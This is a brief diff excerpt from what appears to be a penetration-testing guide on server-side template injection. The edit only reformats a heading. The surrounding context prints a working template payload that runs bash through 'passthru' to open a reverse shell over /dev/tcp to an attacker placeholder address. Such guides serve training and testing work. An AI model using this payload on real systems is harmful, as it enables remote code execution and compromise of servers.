@@ -75,7 +75,7 @@ After identification, we can try the following payloads to perform RCE:
 
 After confirming which payload works, we can get a shell by either rev or bind shell:
 
-Rev-Shell:
+### Rev-Shell:
 ```
 {{ ["bash -c 'exec bash -i >& /dev/tcp/ATTACKBOXIP/1234 0>&1'", ""] | sort('passthru') }}
 ```
